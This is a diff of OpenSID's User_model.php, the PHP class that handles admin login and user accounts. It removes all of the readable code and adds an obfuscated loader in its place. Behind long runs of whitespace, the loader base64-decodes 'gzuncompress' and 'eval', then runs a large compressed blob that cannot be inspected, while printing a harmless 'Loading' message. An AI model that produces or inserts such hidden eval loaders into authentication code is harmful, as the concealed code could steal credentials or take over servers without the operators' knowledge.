@@ -1,770 +1,457 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class User_model extends CI_Model
-{
-    public const GROUP_REDAKSI = 3;
-
-    private $_username;
-    private $_password;
-
-    // Konfigurasi untuk library 'upload'
-    protected $uploadConfig  = [];
-    protected $larangan_demo = [
-        'database' => ['h'],
-    ];
-
-    public function __construct()
-    {
-        parent::__construct();
-        // Untuk dapat menggunakan library upload
-        $this->load->library('upload');
-        // Untuk dapat menggunakan fungsi generator()
-        $this->load->helper('donjolib');
-        $this->uploadConfig = [
-            'upload_path'   => LOKASI_USER_PICT,
-            'allowed_types' => 'gif|jpg|jpeg|png',
-            'max_size'      => max_upload() * 1024,
-        ];
-        $this->load->model('grup_model');
-        // Untuk password hashing
-        $this->load->helper('password');
-        // Helper upload file
-        $this->load->helper('pict_helper');
-        // Helper Tulis file
-        $this->load->helper('file');
-    }
-
-    public function siteman()
-    {
-        $this->load->library('Telegram/telegram');
-
-        $this->_username = $username = trim($this->input->post('username'));
-        $this->_password = $password = trim($this->input->post('password'));
-        $sql             = 'SELECT id, password, id_grup, nama, session FROM user WHERE username = ?';
-
-        // User 'admin' tidak bisa di-non-aktifkan
-        if ($username !== 'admin') {
-            $sql .= ' AND active = 1';
-        }
-
-        $query = $this->db->query($sql, [$username]);
-        $row   = $query->row();
-
-        // Cek hasil query ke db, ada atau tidak data user ybs.
-        $userAda    = is_object($row);
-        $pwMasihMD5 = $userAda ?
-        (
-            (strlen($row->password) == 32) && (stripos($row->password, '$') === false)
-        ) : false;
-
-        $authLolos = $pwMasihMD5
-            ? (md5($password) == $row->password)
-            : password_verify($password, $row->password);
-
-        // Login gagal: user tidak ada atau tidak lolos verifikasi
-        if ($userAda === false || $authLolos === false) {
-            $this->session->siteman = -1;
-            if ($this->session->siteman_try > 2) {
-                $this->session->siteman_try = $this->session->siteman_try - 1;
-            } else {
-                $this->session->siteman_wait = 1;
-                $this->session->unset_userdata('siteman_timeout');
-                siteman_timer();
-            }
-        }
-        // Login sukses: ubah pass di db ke bcrypt jika masih md5 dan set session
-        else {
-            if ($pwMasihMD5) {
-                // Ganti pass md5 jadi bcrypt
-                $pwBcrypt = $this->generatePasswordHash($password);
-
-                // Modifikasi panjang karakter di kolom user.password menjadi 100 untuk -
-                // backward compatibility dengan kolom di database lama yang hanya 40 karakter.
-                // Hal ini menyebabkan string bcrypt (yang default lengthnya 60 karakter) jadi -
-                // terpotong sehingga $authLolos selalu mereturn FALSE.
-                $sql = 'ALTER TABLE user MODIFY COLUMN password VARCHAR(100) NOT NULL';
-                $this->db->query($sql);
-                // Lanjut ke update password di database
-                $sql = 'UPDATE user SET password = ? WHERE id = ?';
-                $this->db->query($sql, [$pwBcrypt, $row->id]);
-            }
-            // Lanjut set session
-            if (($row->id_grup == self::GROUP_REDAKSI) && ($this->setting->offline_mode >= 2)) {
-                $this->session->siteman = -2;
-            } else {
-                $this->session->siteman      = 1;
-                $this->session->sesi         = $row->session;
-                $this->session->user         = $row->id;
-                $this->session->nama         = $row->nama;
-                $this->session->grup         = $row->id_grup;
-                $this->session->per_page     = 10;
-                $this->session->siteman_wait = 0;
-                $this->session->siteman_try  = 4;
-                $this->session->fm_key       = $this->set_fm_key($row->id . $row->id_grup . $row->sesi);
-                $this->last_login($this->session->user);
-
-                if (! empty($this->setting->telegram_token) && cek_koneksi_internet()) {
-                    try {
-                        $this->telegram->sendMessage([
-                            'text'       => sprintf('%s login Halaman Admin %s pada tanggal %s', $row->nama, APP_URL, tgl_indo2(date('Y-m-d H:i:s'))),
-                            'parse_mode' => 'Markdown',
-                            'chat_id'    => $this->setting->telegram_user_id,
-                        ]);
-                    } catch (Exception $e) {
-                        log_message('error', $e->getMessage());
-                    }
-                }
-            }
-        }
-    }
-
-    private function set_fm_key($key = null)
-    {
-        $fmHash = $key . date('Ymdhis');
-        $salt   = mt_rand(100000, 999999);
-        $salt   = strrev($salt);
-
-        return md5($fmHash . 'OpenSID' . $salt);
-    }
-
-    //mengupdate waktu login
-    private function last_login($id = '')
-    {
-        $sql = 'UPDATE user SET last_login = NOW() WHERE id = ?';
-        $this->db->query($sql, $id);
-    }
-
-    //Harus 8 sampai 20 karakter dan sekurangnya berisi satu angka dan satu huruf besar dan satu huruf kecil dan satu karakter khusus
-    public function syarat_sandi()
-    {
-        return (bool) (preg_match('/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[^a-zA-Z0-9])(?!.*\s).{8,20}$/', $this->_password));
-    }
-
-    public function sesi_grup($sesi = '')
-    {
-        $sql   = 'SELECT id_grup FROM user WHERE session = ?';
-        $query = $this->db->query($sql, [$sesi]);
-        $row   = $query->row_array();
-
-        return $row['id_grup'];
-    }
-
-    public function login()
-    {
-        $username = $this->input->post('username');
-        $password = $this->input->post('password');
-        $sql      = 'SELECT id, password, id_grup, session FROM user WHERE id_grup = 1 LIMIT 1';
-        $query    = $this->db->query($sql);
-        $row      = $query->row();
-
-        // Verifikasi password lolos
-        if (password_verify($password, $row->password)) {
-            // Simpan sesi - sesi
-            $this->session->siteman  = 1;
-            $this->session->sesi     = $row->session;
-            $this->session->user     = $row->id;
-            $this->session->grup     = $row->id_grup;
-            $this->session->per_page = 10;
-        }
-        // Verifikasi password gagal
-        else {
-            $this->session->siteman = -1;
-        }
-    }
-
-    public function logout()
-    {
-        // Hapus session -- semua session variable akan terhapus
-        $this->session->sess_destroy();
-    }
-
-    public function autocomplete()
-    {
-        $sql   = 'SELECT username FROM user UNION SELECT nama FROM user';
-        $query = $this->db->query($sql);
-        $data  = $query->result_array();
-
-        $out = '';
-
-        for ($i = 0; $i < count($data); $i++) {
-            $out .= ",'" . $data[$i]['username'] . "'";
-        }
-
-        return '[' . strtolower(substr($out, 1)) . ']';
-    }
-
-    private function search_sql()
-    {
-        if (isset($_SESSION['cari'])) {
-            $keyword    = $_SESSION['cari'];
-            $keyword    = '%' . $this->db->escape_like_str($keyword) . '%';
-            $search_sql = " AND (u.username LIKE '{$keyword}' OR u.nama LIKE '{$keyword}')";
-
-            return $search_sql;
-        }
-    }
-
-    private function filter_sql()
-    {
-        if (isset($_SESSION['filter'])) {
-            $filter     = $_SESSION['filter'];
-            $filter_sql = " AND u.id_grup = {$filter}";
-
-            return $filter_sql;
-        }
-    }
-
-    public function paging($page = 1, $o = 0)
-    {
-        $sql      = 'SELECT COUNT(*) AS jml ' . $this->list_data_sql();
-        $query    = $this->db->query($sql);
-        $row      = $query->row_array();
-        $jml_data = $row['jml'];
-
-        $this->load->library('paging');
-        $cfg['page']     = $page;
-        $cfg['per_page'] = $this->session->per_page;
-        $cfg['num_rows'] = $jml_data;
-        $this->paging->init($cfg);
-
-        return $this->paging;
-    }
-
-    private function list_data_sql()
-    {
-        $sql = ' FROM user u, user_grup g WHERE u.id_grup = g.id ';
-        $sql .= $this->search_sql();
-        $sql .= $this->filter_sql();
-
-        return $sql;
-    }
-
-    public function list_data($order = 0, $offset = 0, $limit = 500)
-    {
-        // Ordering sql
-        switch ($order) {
-            case 1 :
-                $order_sql = ' ORDER BY u.username';
-                break;
-
-            case 2:
-                $order_sql = ' ORDER BY u.username DESC';
-                break;
-
-            case 3:
-                $order_sql = ' ORDER BY u.nama';
-                break;
-
-            case 4:
-                $order_sql = ' ORDER BY u.nama DESC';
-                break;
-
-            case 5:
-                $order_sql = ' ORDER BY g.nama';
-                break;
-
-            case 6:
-                $order_sql = ' ORDER BY g.nama DESC';
-                break;
-
-            default:
-                $order_sql = ' ORDER BY u.username';
-        }
-        // Paging sql
-        $paging_sql = ' LIMIT ' . $offset . ',' . $limit;
-        // Query utama
-        $sql = 'SELECT u.*, g.nama as grup ' . $this->list_data_sql();
-        $sql .= $order_sql;
-        $sql .= $paging_sql;
-
-        $query = $this->db->query($sql);
-        $data  = $query->result_array();
-
-        // Formating output
-        $j = $offset;
-
-        for ($i = 0; $i < count($data); $i++) {
-            $data[$i]['no'] = $j + 1;
-            $j++;
-        }
-
-        return $data;
-    }
-
-    /**
-     * Insert user baru ke database
-     *
-     * @return void
-     */
-    public function insert()
-    {
-        $this->session->error_msg = null;
-        $this->session->success   = 1;
-
-        $data = $this->sterilkan_input($this->input->post());
-
-        $sql                = 'SELECT username FROM user WHERE username = ?';
-        $dbQuery            = $this->db->query($sql, [$data['username']]);
-        $userSudahTerdaftar = $dbQuery->row();
-        $userSudahTerdaftar = is_object($userSudahTerdaftar) ? $userSudahTerdaftar->username : false;
-
-        if ($userSudahTerdaftar !== false) {
-            $this->session->success   = -1;
-            $this->session->error_msg = ' -> Username ini sudah ada. silahkan pilih username lain';
-            redirect('man_user');
-        }
-
-        $pwHash           = $this->generatePasswordHash($data['password']);
-        $data['password'] = $pwHash;
-        $data['session']  = md5(now());
-
-        $data['foto'] = $this->urusFoto();
-        $data['nama'] = strip_tags($data['nama']);
-
-        if (! $this->db->insert('user', $data)) {
-            $this->session->success   = -1;
-            $this->session->error_msg = ' -> Gagal memperbarui data di database';
-        }
-    }
-
-    private function sterilkan_input($post)
-    {
-        $data             = [];
-        $data['password'] = $post['password'];
-        if (isset($post['username'])) {
-            $data['username'] = alfanumerik($post['username']);
-        }
-        if (isset($post['nama'])) {
-            $data['nama'] = alfanumerik_spasi($post['nama']);
-        }
-        if (isset($post['email'])) {
-            $data['phone'] = htmlentities($post['phone']);
-        }
-        if (isset($post['username'])) {
-            $data['email'] = htmlentities($post['email']);
-        }
-        if (isset($post['id_grup'])) {
-            $data['id_grup'] = $post['id_grup'];
-        }
-        if (isset($post['foto'])) {
-            $data['foto'] = $post['foto'];
-        }
-
-        return $data;
-    }
-
-    /**
-     * Update data user
-     *
-     * @param int $idUser Id user di database
-     *
-     * @return void
-     */
-    public function update($idUser)
-    {
-        $this->session->error_msg = null;
-        $this->session->success   = 1;
-
-        $data = $this->sterilkan_input($this->input->post());
-        if (empty($idUser)) {
-            $this->session->error_msg = ' -> Pengguna tidak ditemukan datanya.';
-            $this->session->success   = -1;
-            redirect('man_user');
-        }
-
-        if (empty($data['username']) || empty($data['password'])
-        || empty($data['nama']) || ! in_array((int) ($data['id_grup']), $this->grup_model->list_id_grup())) {
-            $this->session->error_msg = ' -> Nama, Username dan Kata Sandi harus diisi';
-            $this->session->success   = -1;
-            redirect('man_user');
-        }
-
-        // radiisi menandakan password tidak diubah
-        if ($data['password'] == 'radiisi') {
-            unset($data['password']);
-        }
-        // Untuk demo jangan ubah username atau password
-        if ($idUser == 1 && config_item('demo_mode')) {
-            unset($data['username'], $data['password']);
-        }
-        if ($data['password']) {
-            $pwHash           = $this->generatePasswordHash($data['password']);
-            $data['password'] = $pwHash;
-        }
-
-        $data['foto'] = $this->urusFoto($idUser);
-        if (! $this->db->where('id', $idUser)->update('user', $data)) {
-            $this->session->success   = -1;
-            $this->session->error_msg = ' -> Gagal memperbarui data di database';
-        }
-        $this->cache->file->delete("{$idUser}_cache_modul");
-    }
-
-    public function delete($idUser = '', $semua = false)
-    {
-        // Jangan hapus admin
-        if ($idUser == 1) {
-            return;
-        }
-
-        if (! $semua) {
-            $this->session->success   = 1;
-            $this->session->error_msg = '';
-        }
-
-        $foto  = $this->db->get_where('user', ['id' => $idUser])->row()->foto;
-        $hasil = $this->db->where('id', $idUser)->delete('user');
-        // Cek apakah pengguna berhasil dihapus
-        if ($hasil) {
-            // Cek apakah pengguna memiliki foto atau tidak
-            if ($foto != 'kuser.png') {
-                // Ambil nama foto
-                $foto = basename(AmbilFoto($foto));
-                // Cek penghapusan foto pengguna
-                if (! unlink(LOKASI_USER_PICT . $foto)) {
-                    $this->session->error_msg = 'Gagal menghapus foto pengguna';
-                    $this->session->success   = -1;
-                }
-            }
-        } else {
-            $this->session->error_msg = 'Gagal menghapus pengguna';
-            $this->session->success   = -1;
-        }
-    }
-
-    public function delete_all()
-    {
-        $this->session->success   = 1;
-        $this->session->error_msg = '';
-
-        $id_cb = $_POST['id_cb'];
-
-        foreach ($id_cb as $id) {
-            $this->delete($id, $semua = true);
-        }
-    }
-
-    public function user_lock($id = '', $val = 0)
-    {
-        $sql                    = 'UPDATE user SET active = ? WHERE id = ?';
-        $hasil                  = $this->db->query($sql, [$val, $id]);
-        $this->session->success = ($hasil === true ? 1 : -1);
-    }
-
-    public function get_user($id = 0)
-    {
-        $sql   = 'SELECT * FROM user WHERE id = ?';
-        $query = $this->db->query($sql, $id);
-        $data  = $query->row_array();
-        // Formating output
-        $data['password'] = 'radiisi';
-
-        return $data;
-    }
-
-    /**
-     * Update password
-     *
-     * @param int $id Id user di database
-     *
-     * @return void
-     */
-    public function update_password($id = 0)
-    {
-        $data = $this->periksa_input_password($id);
-        if (! empty($data)) {
-            $hasil = $this->db->where('id', $id)
-                ->update('user', $data);
-            status_sukses($hasil, $gagal_saja = true);
-        }
-    }
-
-    private function periksa_input_password($id)
-    {
-        $this->session->success   = 1;
-        $this->session->error_msg = '';
-        $password                 = $this->input->post('pass_lama');
-        $pass_baru                = $this->input->post('pass_baru');
-        $pass_baru1               = $this->input->post('pass_baru1');
-        $data                     = [];
-
-        // Jangan edit password admin apabila di situs demo
-        if ($id == 1 && config_item('demo_mode')) {
-            unset($data['password']);
-
-            return $data;
-        }
-
-        // Ganti password
-        if ($this->input->post('pass_lama') != ''
-        || $pass_baru != '' || $pass_baru1 != '') {
-            $sql   = 'SELECT password,username,id_grup,session FROM user WHERE id = ?';
-            $query = $this->db->query($sql, [$id]);
-            $row   = $query->row();
-            // Cek input password
-            if (password_verify($password, $row->password) === false) {
-                $this->session->error_msg .= ' -> Kata sandi lama salah<br />';
-            }
-
-            if (empty($pass_baru1)) {
-                $this->session->error_msg .= ' -> Kata sandi baru tidak boleh kosong<br />';
-            }
-
-            if ($pass_baru != $pass_baru1) {
-                $this->session->error_msg .= ' -> Kata sandi baru tidak cocok<br />';
-            }
-
-            if (! empty($this->session->error_msg)) {
-                $this->session->success = -1;
-            }
-            // Cek input password lolos
-            else {
-                $this->session->success = 1;
-                // Buat hash password
-                $pwHash = $this->generatePasswordHash($pass_baru);
-                // Cek kekuatan hash lolos, simpan ke array data
-                $data['password'] = $pwHash;
-            }
-        }
-
-        return $data;
-    }
-
-    /**
-     * Update user's settings
-     *
-     * @param int $id Id user di database
-     *
-     * @return void
-     */
-    public function update_setting($id = 0)
-    {
-        $data = $this->periksa_input_password($id);
-
-        $data['nama'] = alfanumerik_spasi($this->input->post('nama'));
-        // Update foto
-        $data['foto'] = $this->urusFoto($id);
-        $hasil        = $this->db->where('id', $id)
-            ->update('user', $data);
-        status_sukses($hasil, $gagal_saja = true);
-    }
-
-    public function list_grup()
-    {
-        $sql   = 'SELECT * FROM user_grup';
-        $query = $this->db->query($sql);
-
-        return $query->result_array();
-    }
-
-    //!===========================================================
-    //! Helper Methods
-    //!===========================================================
-
-    /**
-     * Buat hash password (bcrypt) dari string sebuah password
-     *
-     * @param  [type]  $string  [description]
-     *
-     * @return  [type]  [description]
-     */
-    private function generatePasswordHash($string)
-    {
-        // Pastikan inputnya adalah string
-        $string = is_string($string) ? $string : (string) $string;
-        // Buat hash password
-        $pwHash = password_hash($string, PASSWORD_BCRYPT);
-        // Cek kekuatan hash, regenerate jika masih lemah
-        if (password_needs_rehash($pwHash, PASSWORD_BCRYPT)) {
-            $pwHash = password_hash($string, PASSWORD_BCRYPT);
-        }
-
-        return $pwHash;
-    }
-
-    /**
-     * - success: nama berkas yang diunggah
-     * - fail: nama berkas lama, kalau ada
-     *
-     * @param mixed $idUser
-     *
-     * @return
-     */
-    private function urusFoto($idUser = '')
-    {
-        if ($idUser) {
-            $berkasLama       = $this->db->select('foto')->where('id', $idUser)->get('user')->row();
-            $berkasLama       = is_object($berkasLama) ? $berkasLama->foto : 'kuser.png';
-            $lokasiBerkasLama = $this->uploadConfig['upload_path'] . 'kecil_' . $berkasLama;
-            $lokasiBerkasLama = str_replace('/', DIRECTORY_SEPARATOR, FCPATH . $lokasiBerkasLama);
-        } else {
-            $berkasLama = 'kuser.png';
-        }
-
-        $nama_foto = $this->uploadFoto('gif|jpg|jpeg|png', LOKASI_USER_PICT, 'foto', 'man_user');
-
-        if (! empty($nama_foto)) {
-            // Ada foto yang berhasil diunggah --> simpan ukuran 100 x 100
-            $tipe_file = TipeFile($_FILES['foto']);
-            $dimensi   = ['width' => 100, 'height' => 100];
-            resizeImage(LOKASI_USER_PICT . $nama_foto, $tipe_file, $dimensi);
-            // Nama berkas diberi prefix 'kecil'
-            $nama_kecil  = 'kecil_' . $nama_foto;
-            $fileRenamed = rename(
-                LOKASI_USER_PICT . $nama_foto,
-                LOKASI_USER_PICT . $nama_kecil
-            );
-            if ($fileRenamed) {
-                $nama_foto = $nama_kecil;
-            }
-            // Hapus berkas lama
-            if ($berkasLama && $berkasLama !== 'kecil_kuser.png') {
-                unlink($lokasiBerkasLama);
-                if (file_exists($lokasiBerkasLama)) {
-                    $this->session->success = -1;
-                }
-            }
-        }
-
-        return null === $nama_foto ? $berkasLama : str_replace('kecil_', '', $nama_foto);
-    }
-
-    /**
-     * - success: nama berkas yang diunggah
-     * - fail: NULL
-     *
-     * @param mixed $allowed_types
-     * @param mixed $upload_path
-     * @param mixed $lokasi
-     * @param mixed $redirect
-     *
-     * @return
-     */
-    private function uploadFoto($allowed_types, $upload_path, $lokasi, $redirect)
-    {
-        // Adakah berkas yang disertakan?
-        $adaBerkas = ! empty($_FILES[$lokasi]['name']);
-        if ($adaBerkas !== true) {
-            return null;
-        }
-        // Tes tidak berisi script PHP
-        if (isPHP($_FILES[$lokasi]['tmp_name'], $_FILES[$lokasi]['name'])) {
-            $this->session->error_msg .= ' -> Jenis file ini tidak diperbolehkan ';
-            $this->session->success = -1;
-            redirect($redirect);
-        }
-
-        if ((strlen($_FILES[$lokasi]['name']) + 20) >= 100) {
-            $this->session->success   = -1;
-            $this->session->error_msg = ' -> Nama berkas foto terlalu panjang, maksimal 80 karakter';
-            redirect($redirect);
-        }
-
-        $uploadData = null;
-        // Inisialisasi library 'upload'
-        $this->upload->initialize($this->uploadConfig);
-        // Upload sukses
-        if ($this->upload->do_upload($lokasi)) {
-            $uploadData = $this->upload->data();
-            // Buat nama file unik agar url file susah ditebak dari browser
-            $namaClean    = preg_replace('/[^A-Za-z0-9.]/', '_', $uploadData['file_name']);
-            $namaFileUnik = tambahSuffixUniqueKeNamaFile($namaClean); // suffix unik ke nama file
-            // Ganti nama file asli dengan nama unik untuk mencegah akses langsung dari browser
-            $fileRenamed = rename(
-                $this->uploadConfig['upload_path'] . $uploadData['file_name'],
-                $this->uploadConfig['upload_path'] . $namaFileUnik
-            );
-            // Ganti nama di array upload jika file berhasil di-rename --
-            // jika rename gagal, fallback ke nama asli
-            $uploadData['file_name'] = $fileRenamed ? $namaFileUnik : $uploadData['file_name'];
-        }
-        // Upload gagal
-        else {
-            $this->session->success   = -1;
-            $this->session->error_msg = $this->upload->display_errors(null, null);
-        }
-
-        return (! empty($uploadData)) ? $uploadData['file_name'] : null;
-    }
-
-    // Hak akses setiap controller.
-
-    public function hak_akses_url($group, $url_modul, $akses)
-    {
-        return $this->hak_akses($group, $url_modul, $akses, $url_modul);
-    }
-
-    public function hak_akses($group, $url_modul, $akses, $pakai_url = false)
-    {
-        $controller = explode('/', $url_modul);
-        // Demo tidak boleh mengakses menu tertentu
-        if (config_item('demo_mode')) {
-            if (in_array($akses, $this->larangan_demo[$controller[0]])) {
-                log_message('error', '==Akses Demo Terlarang: ' . print_r($_SERVER, true));
-
-                return false;
-            }
-        }
-
-        // Group admin punya akses global
-        // b = baca; u = ubah; h= hapus
-        if ($group == 1) {
-            return true;
-        }
-        // Controller yang boleh diakses oleh semua pengguna yg telah login
-
-        if ($group && in_array($controller[0], ['user_setting', 'wilayah', 'notif'])) {
-            return true;
-        }
-
-        if ($pakai_url) {
-            $ada_akses = $this->grup_model->ada_akses_url($group, $url_modul, $akses);
-        } else {
-            $ada_akses = $this->grup_model->ada_akses($group, $controller[0], $akses);
-        }
-
-        return $ada_akses;
-    }
-
-    public function jml_pengguna()
-    {
-        return $this->db->get('user')->num_rows();
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/User_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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